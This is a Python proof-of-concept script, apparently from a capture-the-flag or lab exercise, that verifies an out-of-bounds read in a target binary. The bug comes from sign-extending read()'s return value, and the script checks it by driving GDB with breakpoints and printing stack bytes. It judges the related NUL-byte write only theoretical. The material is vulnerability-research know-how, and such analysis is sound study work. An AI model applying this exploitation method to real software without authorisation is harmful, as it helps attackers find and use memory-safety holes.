#!/usr/bin/env python3
"""
PoC for BUG-002: OOB_READ via read() return value signedness mismatch.

Root Cause:
  In main, after read(0, rbp-0x70, 0x100), the return value is stored at
  [rbp-0x4] as a 32-bit int. The code computes eax = return_value - 1,
  uses cdqe to sign-extend to 64 bits, then uses it as index:
    movzx eax, BYTE PTR [rbp+rax*1-0x70]
  When read() returns 0 (EOF), eax = -1, rax = 0xffffffffffffffff,
  access at [rbp - 0x70 - 1] = [rbp - 0x71] — 1 byte below the buffer.
  When read() returns -1 (error), eax = -2, rax = 0xfffffffffffffffe,
  access at [rbp - 0x70 - 2] = [rbp - 0x72] — 2 bytes below the buffer.

  The read byte is compared to 0x0a (newline). If it matches, an OOB
  write of NUL (0x00) occurs at the same negative offset:
    mov BYTE PTR [rbp+rax*1-0x70], 0x0

Primitives:
  PRIM-001: RESTRICTED_READ — 1-byte OOB read below buffer when read returns 0.
    VERIFIED via GDB: access at rbp-0x71, byte read = 0x00, no crash.
  PRIM-002: RESTRICTED_WRITE — conditional NUL byte write at OOB offset.
    THEORETICAL: requires the OOB byte to be 0x0a, but analysis shows
    rbp-0x71 is always 0x00 (init or scanf NUL terminator), never 0x0a.
    scanf %s never writes 0x0a (whitespace stops matching).

Usage:
  python3 poc-BUG-002.py
  (Uses GDB internally to observe the OOB read)
"""
import subprocess
import os

BINARY = "/work/workspace/0008-2021-28-warmup-20260905-182730/target"
WORKSPACE = os.path.dirname(BINARY)

# Create stdin input file: "A\n" then EOF
stdin_file = os.path.join(WORKSPACE, "bug002_input.txt")
with open(stdin_file, "wb") as f:
    f.write(b"A\n")

# GDB script to observe the OOB read when read() returns 0 (EOF)
GDB_SCRIPT = f"""
set pagination off
set confirm off

# Break right after read() returns (0x40123e: mov [rbp-0x4], eax)
b *0x40123e
# Break at the movzx OOB read instruction (0x401249)
b *0x401249

# Run with stdin from file (A\\n then EOF)
run < {stdin_file}

# === First read: returns 2 (A\\n) ===
printf "=== PRIM-001: first read returned rax=%d (0x%x) ===\\n", $rax, $rax

# Continue to first movzx (normal in-bounds access)
continue
printf "=== PRIM-001: first movzx rax=0x%lx (in-bounds, offset %ld from buf) ===\\n", $rax, $rax

# Continue to second read return (EOF → read returns 0)
continue
printf "=== PRIM-001: second read returned rax=%d (EOF=0) ===\\n", $rax

# Continue to second movzx (THIS IS THE OOB READ)
continue
printf "=== PRIM-001: OOB READ at movzx (0x401249) ===\\n"
printf "=== rax=0x%lx (sign-extended -1 from read_return=0) ===\\n", $rax
printf "=== rbp=0x%lx ===\\n", $rbp
printf "=== buffer start (rbp-0x70) = 0x%lx ===\\n", $rbp - 0x70
printf "=== OOB access addr = rbp+rax-0x70 = 0x%lx ===\\n", $rbp + $rax - 0x70
printf "=== offset from buffer start = %ld bytes (BELOW buffer = OOB) ===\\n", ($rbp + $rax - 0x70) - ($rbp - 0x70)
printf "=== byte read at OOB addr = 0x%02x ===\\n", *(unsigned char*)($rbp + $rax - 0x70)
printf "=== byte compared to 0x0a: %s ===\\n", (*(unsigned char*)($rbp + $rax - 0x70) == 0x0a) ? "MATCH->would_trigger_OOB_WRITE" : "NO_MATCH->no_write"
printf "=== PRIM-001: VERIFIED (1-byte OOB read at rbp-0x71 when read returns 0/EOF) ===\\n"

# Show the stack layout around the OOB address
printf "=== Stack layout around OOB address: ===\\n"
printf "=== [rbp-0x78] (scanf field) = 0x%02x ===\\n", *(unsigned char*)($rbp - 0x78)
printf "=== [rbp-0x71] (OOB read addr) = 0x%02x ===\\n", *(unsigned char*)($rbp - 0x71)
printf "=== [rbp-0x70] (buffer start) = 0x%02x ===\\n", *(unsigned char*)($rbp - 0x70)
printf "=== rbp-0x71 is always 0x00 (init: mov QWORD[rbp-0x78],0x4e → low byte=0x4e, rest=0x00) ===\\n"
printf "=== scanf %%7s never writes 0x0a (whitespace stops %%s matching) ===\\n"
printf "=== PRIM-002: THEORETICAL (OOB write requires byte==0x0a, but byte is always 0x00) ===\\n"

quit
"""

def main():
    gdb_script_path = os.path.join(WORKSPACE, "gdb_bug002.txt")
    with open(gdb_script_path, "w") as f:
        f.write(GDB_SCRIPT)

    cmd = ["gdb", "-batch", "-x", gdb_script_path, BINARY]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

    print("=== GDB Output ===")
    print(result.stdout)
    if result.stderr:
        for line in result.stderr.splitlines():
            low = line.lower()
            if any(x in low for x in ["warning", "thread", "libthread", "reading"]):
                continue
            print(line)
    print(f"=== Return code: {result.returncode} ===")

if __name__ == "__main__":
    main()
